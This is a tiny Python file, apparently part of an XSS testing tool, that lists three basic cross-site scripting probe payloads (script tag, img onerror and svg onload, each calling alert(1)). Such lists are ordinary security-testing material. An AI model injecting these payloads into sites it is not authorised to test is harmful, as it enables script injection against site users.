# payloads/base_payloads.py

BASE_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    # Add more base payloads as needed
]
